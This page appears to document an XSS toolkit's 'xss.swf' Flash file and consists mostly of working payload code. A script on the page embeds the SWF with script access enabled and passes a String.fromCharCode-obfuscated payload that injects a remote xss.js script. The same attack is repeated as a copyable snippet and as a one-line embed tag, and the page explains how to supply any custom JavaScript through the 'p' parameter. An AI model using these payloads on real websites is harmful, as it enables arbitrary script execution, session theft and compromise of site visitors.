# [XSS](/xss/) / xss.swf

## Requirements

- You'll need to enable flash :D [chrome](https://support.digication.com/hc/en-us/articles/115003963468-Enabling-Flash-for-Google-Chrome-Windows-Macintosh-)

## Examples
**If data shows up here after the 1 second delay, that means the JS was executed.**
<pre id="xss-console-log"></pre>

<script>
(function () {
  let payload = `String.fromCharCode(${"var s=document.createElement('script'); s.src='https://defektive.github.io/xss/dist/xss.js'; document.body.appendChild(s)".split('').map(function (e){return e.charCodeAt(0)}).join(',')})`

  let t = new Date().getTime();

  let embed = document.createElement('embed');
  embed.setAttribute('height', '6');
  embed.setAttribute('width', '6');
  embed.setAttribute('allowscriptaccess', 'always');
  embed.setAttribute('src', 'https://defektive.github.io/xss/dist/xss.swf?t='+t + '&p='+ payload);

  document.body.appendChild(embed);
})();
</script>

---
### Example used here

```html
<script>
(function () {
  let payload = `String.fromCharCode(${"var s=document.createElement('script'); s.src='https://defektive.github.io/xss/dist/xss.js'; document.body.appendChild(s)".split('').map(function (e){return e.charCodeAt(0)}).join(',')})`

  let t = new Date().getTime();

  let embed = document.createElement('embed');
  embed.setAttribute('height', '400');
  embed.setAttribute('width', '400');
  embed.setAttribute('allowscriptaccess', 'always');
  embed.setAttribute('src', 'https://defektive.github.io/xss/dist/xss.swf?t='+t + '&p='+ payload);

  document.body.appendChild(embed);
})();
</script>
```

### Super Simple Example
```html

<embed height="400" width="400" allowscriptaccess="always" src="https://defektive.github.io/xss/dist/xss.swf?t=1548861488287&amp;p=String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,115,114,99,61,39,104,116,116,112,115,58,47,47,100,101,102,101,107,116,105,118,101,46,103,105,116,104,117,98,46,105,111,47,120,115,115,47,100,105,115,116,47,120,115,115,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41)">


```

## Custom Payloads

You should be able to set the `p` parameter to whatever js you want. Here is a snippet you can modify.

```js

String.fromCharCode(${"console.log('hello from the params')".split('').map(function (e){return e.charCodeAt(0)}).join(',')})

```

## Want to build your own?

Should be as simple as running `docker/build.sh`. This will compile a swf from `src/xss.as`, and save it as `dist/xss.swf`
